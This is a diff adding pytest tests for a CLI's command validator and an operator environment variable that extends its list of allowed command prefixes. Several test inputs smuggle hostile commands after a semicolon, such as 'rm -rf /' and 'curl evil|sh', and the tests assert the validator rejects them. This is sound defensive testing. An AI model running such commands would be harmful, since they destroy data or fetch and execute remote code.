@@ -64,10 +64,12 @@ from iterate_cli.refresh import (
     load_onboarding_config,
 )
 from iterate_cli.personalize import (
+    EXTRA_SAFE_PREFIXES_ENV,
     DimensionFocusOverride,
     KnownIntentional,
     PersonalizationData,
     RiskArea,
+    _operator_extra_prefixes,
     load_existing_personalization,
     load_personalization_from_config,
     load_personalization_from_iterate_md,
@@ -3728,3 +3730,53 @@ class TestValidateExtraCommand:
         """Even pytest cannot bypass the metacharacter check."""
         is_valid, reason = validate_extra_command("pytest; rm -rf /")
         assert is_valid is False
+
+
+class TestOperatorExtraPrefixes:
+    """Tests for the operator-level env extension point (problem-5 fix).
+
+    The env var lets an operator add safe prefixes without editing source,
+    while remaining fail-closed: tokens with shell metacharacters are
+    dropped, and the default (env unset) keeps the strict built-in list.
+    """
+
+    def test_env_unset_returns_empty(self, monkeypatch) -> None:
+        monkeypatch.delenv(EXTRA_SAFE_PREFIXES_ENV, raising=False)
+        assert _operator_extra_prefixes() == ()
+
+    def test_env_empty_returns_empty(self, monkeypatch) -> None:
+        monkeypatch.setenv(EXTRA_SAFE_PREFIXES_ENV, "   ")
+        assert _operator_extra_prefixes() == ()
+
+    def test_env_parses_tokens(self, monkeypatch) -> None:
+        monkeypatch.setenv(
+            EXTRA_SAFE_PREFIXES_ENV, "safety, sqlfluff   hadolint"
+        )
+        assert _operator_extra_prefixes() == ("safety", "sqlfluff", "hadolint")
+
+    def test_env_drops_metachar_tokens(self, monkeypatch) -> None:
+        """Fail-closed: a malicious token is silently dropped, not trusted."""
+        monkeypatch.setenv(
+            EXTRA_SAFE_PREFIXES_ENV, "safety;rm -rf /,sqlfluff;curl evil|sh"
+        )
+        assert _operator_extra_prefixes() == ()
+
+    def test_env_extends_whitelist(self, monkeypatch) -> None:
+        """Operator-approved prefix becomes acceptable for validation."""
+        monkeypatch.setenv(EXTRA_SAFE_PREFIXES_ENV, "safety")
+        is_valid, reason = validate_extra_command("safety check --full")
+        assert is_valid is True
+        assert reason == ""
+
+    def test_env_extended_prefix_still_rejects_metachar(self, monkeypatch) -> None:
+        """Even an operator-approved prefix cannot bypass metachar checks."""
+        monkeypatch.setenv(EXTRA_SAFE_PREFIXES_ENV, "safety")
+        is_valid, reason = validate_extra_command("safety check; rm -rf /")
+        assert is_valid is False
+
+    def test_env_python_m_extension(self, monkeypatch) -> None:
+        """python -m form also honors operator-extended prefixes."""
+        monkeypatch.setenv(EXTRA_SAFE_PREFIXES_ENV, "safety")
+        is_valid, reason = validate_extra_command("python -m safety check")
+        assert is_valid is True
+        assert reason == ""
